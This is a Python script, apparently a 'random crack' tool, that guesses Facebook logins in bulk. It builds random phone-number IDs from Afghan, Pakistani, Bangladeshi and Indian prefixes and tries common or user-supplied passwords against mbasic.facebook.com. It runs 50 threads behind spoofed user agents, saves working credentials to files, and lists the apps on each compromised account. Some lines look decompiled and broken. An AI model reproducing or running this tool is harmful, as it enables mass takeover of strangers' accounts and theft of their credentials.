
import os
import sys
import time
import requests
import uuid
os.system('git pull')
os.system('pkg install curl')



def AHMADO():
    os.system('clear')
    print(logo)
    print('')
    print('\33[37;41m\t\x1b[1;32m[1]\x1b[1;33m RANDOM CRACK ')
    print#('\x1b[1;32m[2]\x1b[1;32m CONTACT ME ON FACEBOOK')
    print#('\x1b[1;32m[3]\x1b[1;32m FOLLOW MY  FB PAGE')
    print#('\x1b[1;32m[0]\x1b[1;31m EXIT')
    opt = input('\n\x1b[1;32m CHOOSE OPTION >>> ')
    if opt == '1':
        i()
    if opt == '2':
        os.system('xdg-open https://www.facebook.com/AhmaDo.PodAri.76')
        return None
    if opt == '3':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100084946517175')
        return None
    if opt == '0':
        os.system('exit')
        return None
    None('\n\x1b[1;31m  Choose valid option\x1b[0;97m')


import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[•] %s \x1b[1;95m Your Active Apps     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://free.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[•] %s \x1b[1;95m Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')
 
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://free.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://free.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            
 
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo = ("""\033[132m
\033[1;93m$$$$$$$$\ $$$$$$$$\  $$$$$$\  
\____$$  |$$  _____|$$  __$$\ 
    $$  / $$ |      $$ /  $$ |
   $$  /  $$$$$\    $$$$$$$$ |
  $$  /   $$  __|   $$  __$$ |
 $$  /    $$ |      $$ |  $$ |
$$$$$$$$\ $$$$$$$$\ $$ |  $$ |
\________|\________|\__|  \__|
\033[1;92m+==============================================================+
|    𝑨𝒖𝒕𝒉𝒐𝒓       :   amir
|    𝑭𝒂𝒄𝒆𝒃𝒐𝒐𝒌     :   amir
|   𝑻𝒆𝒍𝒆𝒈𝒓𝒂𝒎      :  @amir
|   𝑰𝑫            :  @amir
|   𝑾𝒉𝒂𝒕𝒔𝒂𝒑𝒑      :   𝑺𝒐𝒓𝒓𝒚 𝑭𝒐𝒓 𝑻𝒂𝒉𝒕
|   𝒇𝒓𝒆𝒆          :     𝑻𝒐𝒐𝒍𝒔
|   𝑻𝒐𝒐𝒍𝒔         :   𝑹𝑬𝑵𝑫𝑶𝑴
+==============================================================+
|    𝑴𝒚 𝑩𝒆𝒔𝒕 𝑭𝒓𝒊𝒆𝒏𝒅  zam zam
+==============================================================+""")
os.system('xdg-open https://www.facebook.com/profile.php?id=100007958834693')
loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLOADING ASSET FILES ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNO INTERNET CONNECTION ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1) 
 
#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    
# APK CHECK
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    jalan(logo)
    
    
    print("	\33[37;41m\t  USE OUR COUNTRY CODE  \33[0;m")
    print('\33[1;32m ENTER Code Every country')
    print('')
    print('\033[1;32m  AFG  CODES -OK IDS :  \033[1;33m9379, \033[1;33m9378 ,\033[1;33m9370 ,\033[1;33m9377  ...\033[0;97m')
    print('\033[1;37m ══════════════════════════════════════════════════════════')
    print('\033[1;32m  PAK CODES -OK IDS :  \033[1;33m92301, \033[1;33m92302 ,\033[1;33m92303 ,\033[1;33m92305  ...\033[0;97m')
    print('\033[1;37m ══════════════════════════════════════════════════════════')
    print('\033[1;32m  BD CODES -OK IDS :  \033[1;33m88016, \033[1;33m88017 ,\033[1;33m88018 ,\033[1;33m88019  ...\033[0;97m')
    print('\033[1;37m ══════════════════════════════════════════════════════════')
    print('\033[1;32m  INDIA CODES -OK IDS :  \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
    print('\033[1;37m ══════════════════════════════════════════════════════════\n')
    code = input(' PUT CODE : ')
    print("")
    limit = int(input(' EXAMPLE: 2000, 3000, 50000, 100000\n\n PUT CLONING LIMIT: '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    os.system("clear")
    print(logo)
    passx = int(input("[*] ENTER PASSWORD LIMIT : "))
    HamiiID = []
    print("")
    for bilal in range(passx):
        pww = input("[*] ENTER PASSWORD : ")
        HamiiID.append(pww)
    with ThreadPool(max_workers=50) as manshera:
        clear()
        tl = str(len(user))
        print(f'{WHITE}=============================================================')
        print(f" {GREEN}TODAY DATE & TIME     :{RED} {ha}/{bu}/{ta} {ORANGE}~> {GREEN} "+str(a)+":"+str(lt()[4])+" "+ tag+" ")
        print(f"{WHITE}=============================================================")
        print('\033[1;37m TOTAL IDS: '+tl)
        print('\033[1;37m THE PROCESS HAS BEEN STARTED')
        print('\033[1;92m\x1b[38;5;208m\r USE AEROPLANE MOOD IN EVERY 5 MIN ')
        print('\033[1;37m =============================================================')
        for love in user:
            uid = code+love
            pwx = [love,'afghan123','kabul1234']
            for Eman in HamiiID:
                pwx.append(Eman)
            manshera.submit(rcrack,uid,pwx,tl)
    print('\033[1;37m =============================================================')
    print('CRACK PROCESS HAS BEEN COMPLETED')
    print('IDS SAVED IN OK.TXT,CP.TXT')
    print('\033[1;37m =============================================================')
 
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
            'method': 'GET', 
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-encoding': 'gzip,', 'accept-language': 'en-US,en;q=0.9,bn;q=0.8', 
            'sec-ch-ua': '"Chromium";v="106",', 
            'sec-ch-ua-mobile': '?0', 
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document', 
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none', 
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1', 
            'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('    \033[1;32m(𝒁𝑬𝑨-OK😍)  ' +cid+ ' | ' +ps+    '\033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/𝒁𝑬𝑨-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\033[1;92m\x1b[38;5;208m(𝒁𝑬𝑨-CP😭)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/𝒁𝑬𝑨-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[𝒁𝑬𝑨] [%s/%s] [OK %s  CP %s] \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
 
AHMADO()
 
